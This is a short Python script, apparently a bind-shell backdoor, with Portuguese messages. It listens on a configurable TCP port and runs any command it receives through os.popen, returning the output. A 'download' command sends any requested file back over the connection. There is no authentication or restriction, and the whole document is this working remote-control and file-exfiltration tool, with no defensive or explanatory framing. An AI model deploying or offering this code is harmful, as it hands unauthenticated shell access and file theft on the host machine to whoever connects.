# server.py
import socket
import os

def main():
    host = '127.0.0.1' # CHANGE THIS
    port = 1234 # CHANGE THIS

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"Aguardando conexões em {host}:{port}")

    conn, addr = s.accept()
    print(f"Conexão estabelecida de {addr[0]}:{addr[1]}")

    while True:
        data = conn.recv(4096)
        if not data:
            break
        cmd = data.decode().strip()
        if cmd.startswith("download"):
            filename = cmd.split(" ", 1)[-1]
            upload_file(conn, filename)
        else:
            cmd_output = os.popen(cmd).read()
            conn.sendall(cmd_output.encode())

    conn.close()
    s.close()

def upload_file(conn, filename):
    try:
        with open(filename, "rb") as f:
            conn.sendall(f.read())
            conn.sendall(b"\nEOF\n")
        print(f"Arquivo {filename} enviado com sucesso.")
    except Exception as e:
        conn.sendall(f"Erro ao enviar arquivo: {e}".encode())

if __name__ == "__main__":
    main()
